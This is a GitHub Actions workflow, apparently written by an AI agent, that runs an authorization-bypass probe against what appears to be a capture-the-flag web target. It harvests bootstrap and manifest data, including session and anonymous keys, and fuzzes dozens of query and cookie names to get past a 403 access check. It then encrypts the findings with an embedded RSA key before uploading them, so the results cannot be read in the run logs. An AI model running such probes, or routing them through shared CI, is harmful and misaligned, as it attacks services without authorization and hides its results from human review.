name: launchlet-part2-auth-probe

on:
  push:
    branches: [agent/launchlet-part2-auth-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Bulk probe query and cookie preview context carriers
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint']); body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
          keys=['preview','preview_context','previewContext','context','context_id','contextId','preview_token','previewToken','token','preview_session','previewSession','session','scope','capability','preview_capability','previewCapability','mode','stage','environment','source','role','client','runtime','studio','preview_mode','previewMode','request_context','requestContext','client_context','clientContext','runtime_context','runtimeContext']
          values=['preview','1','true','enabled','active','yes','on','guest','public','studio','browser','live','sandbox','internal',boot['client']['session'],boot['client']['anonKey'],boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime'],'preview:guest','preview:public','preview:receipt:read','caplag{preview_manifest_kept_the_receipt}']
          baseh={'Accept':'application/json','Content-Type':'application/json'}; baseline=(403,'{"error":"preview_context_required"}'); hits=[]
          for val in values:
              params={k:val for k in keys}
              r=s.post(url+'?'+urllib.parse.urlencode(params),headers=baseh,json=body,timeout=15,allow_redirects=False)
              if (r.status_code,r.text.strip())!=baseline:
                  hits.append({'carrier':'query','value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                  if r.status_code==200 or 'caplag{' in r.text: break
          if not any(x['status']==200 or 'caplag{' in x['body'] for x in hits):
              for val in values:
                  cookies={k:val for k in keys}
                  r=s.post(url,headers=baseh,cookies=cookies,json=body,timeout=15,allow_redirects=False)
                  if (r.status_code,r.text.strip())!=baseline:
                      hits.append({'carrier':'cookie','value':val,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                      if r.status_code==200 or 'caplag{' in r.text: break
          (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-querycookie-encrypted
          path: artifact/
          retention-days: 1
